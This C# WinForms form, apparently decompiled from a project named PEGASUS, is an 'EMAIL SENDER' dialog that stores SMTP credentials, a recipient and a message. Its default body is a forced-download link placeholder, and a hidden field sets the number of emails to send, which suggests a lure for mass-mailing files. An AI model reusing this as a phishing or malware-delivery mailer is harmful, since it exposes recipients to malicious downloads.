using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class FrmEmailer : Form
	{
		private IContainer components;

		private Guna2Panel guna2Panel1;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2Separator guna2Separator1;

		private PictureBox pictureBox1;

		private Label label15;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		public Guna2GradientButton btnSend;

		private Label label4;

		private Label label3;

		private Label label2;

		private Label label1;

		private Label label8;

		private Label label7;

		private Label label6;

		private Label label5;

		public Guna2TextBox txtBody;

		public Guna2TextBox txtHost;

		public Guna2TextBox txtPassword;

		public Guna2TextBox txttoEmail;

		public Guna2TextBox txtsubject;

		public Guna2TextBox txtfromEmail;

		public Guna2TextBox txtEmailPort;

		public Guna2TextBox guna2TextBox2;

		public FrmEmailer()
		{
			InitializeComponent();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void FrmEmailer_Load(object sender, EventArgs e)
		{
			txtfromEmail.Text = PEGASUS.Properties.Settings.Default.txtfromEmail;
			txttoEmail.Text = PEGASUS.Properties.Settings.Default.txttoEmail;
			txtPassword.Text = PEGASUS.Properties.Settings.Default.txtemailPass;
			txtBody.Text = PEGASUS.Properties.Settings.Default.txtBody;
			txtsubject.Text = PEGASUS.Properties.Settings.Default.txtSubject;
			txtEmailPort.Text = PEGASUS.Properties.Settings.Default.emailport;
			txtHost.Text = PEGASUS.Properties.Settings.Default.Host;
		}

		private void btnSend_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrWhiteSpace(txtfromEmail.Text) && !string.IsNullOrWhiteSpace(txttoEmail.Text) && !string.IsNullOrWhiteSpace(txtPassword.Text) && !string.IsNullOrWhiteSpace(txtsubject.Text) && !string.IsNullOrWhiteSpace(txtBody.Text) && !string.IsNullOrWhiteSpace(txtEmailPort.Text) && !string.IsNullOrWhiteSpace(txtHost.Text))
			{
				base.DialogResult = DialogResult.OK;
				PEGASUS.Properties.Settings.Default.txtfromEmail = txtfromEmail.Text;
				PEGASUS.Properties.Settings.Default.txttoEmail = txttoEmail.Text;
				PEGASUS.Properties.Settings.Default.txtemailPass = txtPassword.Text;
				PEGASUS.Properties.Settings.Default.txtBody = txtBody.Text;
				PEGASUS.Properties.Settings.Default.txtSubject = txtsubject.Text;
				PEGASUS.Properties.Settings.Default.emailport = txtEmailPort.Text;
				PEGASUS.Properties.Settings.Default.Host = txtHost.Text;
				PEGASUS.Properties.Settings.Default.Save();
				Hide();
			}
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmEmailer));
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label15 = new System.Windows.Forms.Label();
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			txtBody = new Guna.UI2.WinForms.Guna2TextBox();
			btnSend = new Guna.UI2.WinForms.Guna2GradientButton();
			txtEmailPort = new Guna.UI2.WinForms.Guna2TextBox();
			txtfromEmail = new Guna.UI2.WinForms.Guna2TextBox();
			txtsubject = new Guna.UI2.WinForms.Guna2TextBox();
			txttoEmail = new Guna.UI2.WinForms.Guna2TextBox();
			txtPassword = new Guna.UI2.WinForms.Guna2TextBox();
			txtHost = new Guna.UI2.WinForms.Guna2TextBox();
			guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
			label1 = new System.Windows.Forms.Label();
			label2 = new System.Windows.Forms.Label();
			label3 = new System.Windows.Forms.Label();
			label4 = new System.Windows.Forms.Label();
			label5 = new System.Windows.Forms.Label();
			label6 = new System.Windows.Forms.Label();
			label7 = new System.Windows.Forms.Label();
			label8 = new System.Windows.Forms.Label();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(label15);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(973, 78);
			guna2Panel1.TabIndex = 140;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(932, 13);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 29);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 114;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-198, 71);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1370, 12);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 14);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 50);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 12;
			pictureBox1.TabStop = false;
			label15.Anchor = System.Windows.Forms.AnchorStyles.Top;
			label15.AutoSize = true;
			label15.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label15.ForeColor = System.Drawing.Color.LightGray;
			label15.Location = new System.Drawing.Point(416, 22);
			label15.Name = "label15";
			label15.Size = new System.Drawing.Size(138, 19);
			label15.TabIndex = 11;
			label15.Text = "EMAIL SENDER";
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtBody.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtBody.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtBody.DefaultText = "<a href=\"YOUR LINK HERE\" DOWNLOAD>";
			txtBody.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtBody.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtBody.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtBody.DisabledState.Parent = txtBody;
			txtBody.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtBody.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtBody.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtBody.FocusedState.Parent = txtBody;
			txtBody.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtBody.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtBody.HoverState.Parent = txtBody;
			txtBody.Location = new System.Drawing.Point(56, 207);
			txtBody.Name = "txtBody";
			txtBody.PasswordChar = '\0';
			txtBody.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtBody.PlaceholderText = "Body";
			txtBody.ScrollBars = System.Windows.Forms.ScrollBars.Both;
			txtBody.SelectedText = "";
			txtBody.SelectionStart = 34;
			txtBody.ShadowDecoration.Parent = txtBody;
			txtBody.Size = new System.Drawing.Size(865, 191);
			txtBody.TabIndex = 155;
			btnSend.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnSend.BorderThickness = 1;
			btnSend.CheckedState.Parent = btnSend;
			btnSend.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnSend.CustomImages.Parent = btnSend;
			btnSend.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnSend.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnSend.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSend.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSend.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnSend.DisabledState.Parent = btnSend;
			btnSend.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSend.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnSend.Font = new System.Drawing.Font("Electrolize", 9f);
			btnSend.ForeColor = System.Drawing.Color.White;
			btnSend.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnSend.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnSend.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnSend.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnSend.HoverState.Parent = btnSend;
			btnSend.Location = new System.Drawing.Point(785, 583);
			btnSend.Name = "btnSend";
			btnSend.ShadowDecoration.Parent = btnSend;
			btnSend.Size = new System.Drawing.Size(136, 32);
			btnSend.TabIndex = 153;
			btnSend.Text = "Send";
			btnSend.Click += new System.EventHandler(btnSend_Click);
			txtEmailPort.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmailPort.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtEmailPort.DefaultText = "587";
			txtEmailPort.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtEmailPort.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtEmailPort.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmailPort.DisabledState.Parent = txtEmailPort;
			txtEmailPort.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmailPort.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtEmailPort.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtEmailPort.FocusedState.Parent = txtEmailPort;
			txtEmailPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtEmailPort.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtEmailPort.HoverState.Parent = txtEmailPort;
			txtEmailPort.Location = new System.Drawing.Point(56, 405);
			txtEmailPort.Name = "txtEmailPort";
			txtEmailPort.PasswordChar = '\0';
			txtEmailPort.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtEmailPort.PlaceholderText = "Port";
			txtEmailPort.SelectedText = "";
			txtEmailPort.SelectionStart = 3;
			txtEmailPort.ShadowDecoration.Parent = txtEmailPort;
			txtEmailPort.Size = new System.Drawing.Size(865, 22);
			txtEmailPort.TabIndex = 158;
			txtfromEmail.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtfromEmail.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtfromEmail.DefaultText = "";
			txtfromEmail.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtfromEmail.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtfromEmail.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtfromEmail.DisabledState.Parent = txtfromEmail;
			txtfromEmail.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtfromEmail.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtfromEmail.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtfromEmail.FocusedState.Parent = txtfromEmail;
			txtfromEmail.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtfromEmail.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtfromEmail.HoverState.Parent = txtfromEmail;
			txtfromEmail.Location = new System.Drawing.Point(56, 434);
			txtfromEmail.Name = "txtfromEmail";
			txtfromEmail.PasswordChar = '\0';
			txtfromEmail.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtfromEmail.PlaceholderText = "Email";
			txtfromEmail.SelectedText = "";
			txtfromEmail.ShadowDecoration.Parent = txtfromEmail;
			txtfromEmail.Size = new System.Drawing.Size(865, 22);
			txtfromEmail.TabIndex = 159;
			txtsubject.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtsubject.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtsubject.DefaultText = "";
			txtsubject.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtsubject.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtsubject.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtsubject.DisabledState.Parent = txtsubject;
			txtsubject.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtsubject.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtsubject.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtsubject.FocusedState.Parent = txtsubject;
			txtsubject.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtsubject.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtsubject.HoverState.Parent = txtsubject;
			txtsubject.Location = new System.Drawing.Point(56, 178);
			txtsubject.Name = "txtsubject";
			txtsubject.PasswordChar = '\0';
			txtsubject.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtsubject.PlaceholderText = "Subject";
			txtsubject.SelectedText = "";
			txtsubject.ShadowDecoration.Parent = txtsubject;
			txtsubject.Size = new System.Drawing.Size(865, 22);
			txtsubject.TabIndex = 160;
			txttoEmail.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txttoEmail.Cursor = System.Windows.Forms.Cursors.IBeam;
			txttoEmail.DefaultText = "";
			txttoEmail.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txttoEmail.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txttoEmail.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txttoEmail.DisabledState.Parent = txttoEmail;
			txttoEmail.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txttoEmail.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txttoEmail.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txttoEmail.FocusedState.Parent = txttoEmail;
			txttoEmail.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txttoEmail.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txttoEmail.HoverState.Parent = txttoEmail;
			txttoEmail.Location = new System.Drawing.Point(56, 149);
			txttoEmail.Name = "txttoEmail";
			txttoEmail.PasswordChar = '\0';
			txttoEmail.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txttoEmail.PlaceholderText = "To";
			txttoEmail.SelectedText = "";
			txttoEmail.ShadowDecoration.Parent = txttoEmail;
			txttoEmail.Size = new System.Drawing.Size(865, 22);
			txttoEmail.TabIndex = 161;
			txtPassword.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPassword.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtPassword.DefaultText = "";
			txtPassword.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtPassword.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtPassword.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPassword.DisabledState.Parent = txtPassword;
			txtPassword.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPassword.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtPassword.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtPassword.FocusedState.Parent = txtPassword;
			txtPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtPassword.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtPassword.HoverState.Parent = txtPassword;
			txtPassword.Location = new System.Drawing.Point(56, 463);
			txtPassword.Name = "txtPassword";
			txtPassword.PasswordChar = '\0';
			txtPassword.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtPassword.PlaceholderText = "Password";
			txtPassword.SelectedText = "";
			txtPassword.ShadowDecoration.Parent = txtPassword;
			txtPassword.Size = new System.Drawing.Size(865, 22);
			txtPassword.TabIndex = 162;
			txtHost.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtHost.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtHost.DefaultText = "smtp.gmail.com";
			txtHost.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			txtHost.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtHost.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtHost.DisabledState.Parent = txtHost;
			txtHost.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtHost.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			txtHost.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtHost.FocusedState.Parent = txtHost;
			txtHost.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			txtHost.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			txtHost.HoverState.Parent = txtHost;
			txtHost.Location = new System.Drawing.Point(56, 492);
			txtHost.Name = "txtHost";
			txtHost.PasswordChar = '\0';
			txtHost.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtHost.PlaceholderText = "Smtp Host";
			txtHost.SelectedText = "";
			txtHost.SelectionStart = 14;
			txtHost.ShadowDecoration.Parent = txtHost;
			txtHost.Size = new System.Drawing.Size(865, 22);
			txtHost.TabIndex = 163;
			guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
			guna2TextBox2.DefaultText = "";
			guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2TextBox2.DisabledState.Parent = guna2TextBox2;
			guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2TextBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2TextBox2.FocusedState.Parent = guna2TextBox2;
			guna2TextBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2TextBox2.HoverState.Parent = guna2TextBox2;
			guna2TextBox2.Location = new System.Drawing.Point(56, 521);
			guna2TextBox2.Name = "guna2TextBox2";
			guna2TextBox2.PasswordChar = '\0';
			guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			guna2TextBox2.PlaceholderText = "Number of emails to send";
			guna2TextBox2.SelectedText = "";
			guna2TextBox2.ShadowDecoration.Parent = guna2TextBox2;
			guna2TextBox2.Size = new System.Drawing.Size(865, 22);
			guna2TextBox2.TabIndex = 164;
			guna2TextBox2.Visible = false;
			label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label1.AutoSize = true;
			label1.ForeColor = System.Drawing.Color.IndianRed;
			label1.Location = new System.Drawing.Point(27, 571);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(59, 14);
			label1.TabIndex = 169;
			label1.Text = "Port 587: ";
			label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label2.AutoSize = true;
			label2.ForeColor = System.Drawing.Color.IndianRed;
			label2.Location = new System.Drawing.Point(27, 587);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(65, 14);
			label2.TabIndex = 170;
			label2.Text = "Port 2525: ";
			label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label3.AutoSize = true;
			label3.ForeColor = System.Drawing.Color.IndianRed;
			label3.Location = new System.Drawing.Point(27, 603);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(59, 14);
			label3.TabIndex = 171;
			label3.Text = "Port 465: ";
			label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label4.AutoSize = true;
			label4.ForeColor = System.Drawing.Color.IndianRed;
			label4.Location = new System.Drawing.Point(27, 619);
			label4.Name = "label4";
			label4.Size = new System.Drawing.Size(51, 14);
			label4.TabIndex = 172;
			label4.Text = "Port 25: ";
			label5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label5.AutoSize = true;
			label5.Location = new System.Drawing.Point(85, 571);
			label5.Name = "label5";
			label5.Size = new System.Drawing.Size(168, 14);
			label5.TabIndex = 173;
			label5.Text = "The standard secure SMTP port";
			label6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label6.AutoSize = true;
			label6.Location = new System.Drawing.Point(85, 587);
			label6.Name = "label6";
			label6.Size = new System.Drawing.Size(166, 14);
			label6.TabIndex = 174;
			label6.Text = "A common alternate SMTP port";
			label7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label7.AutoSize = true;
			label7.Location = new System.Drawing.Point(85, 603);
			label7.Name = "label7";
			label7.Size = new System.Drawing.Size(207, 14);
			label7.TabIndex = 175;
			label7.Text = "Deprecated and out-of-date SMTP port";
			label8.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			label8.AutoSize = true;
			label8.Location = new System.Drawing.Point(85, 619);
			label8.Name = "label8";
			label8.Size = new System.Drawing.Size(169, 14);
			label8.TabIndex = 176;
			label8.Text = "The original standard SMTP port";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(973, 659);
			base.Controls.Add(label8);
			base.Controls.Add(label7);
			base.Controls.Add(label6);
			base.Controls.Add(label5);
			base.Controls.Add(label4);
			base.Controls.Add(label3);
			base.Controls.Add(label2);
			base.Controls.Add(label1);
			base.Controls.Add(guna2TextBox2);
			base.Controls.Add(txtHost);
			base.Controls.Add(txtPassword);
			base.Controls.Add(txttoEmail);
			base.Controls.Add(txtsubject);
			base.Controls.Add(txtfromEmail);
			base.Controls.Add(txtEmailPort);
			base.Controls.Add(txtBody);
			base.Controls.Add(btnSend);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Name = "FrmEmailer";
			Text = "FrmEmailer";
			base.Load += new System.EventHandler(FrmEmailer_Load);
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}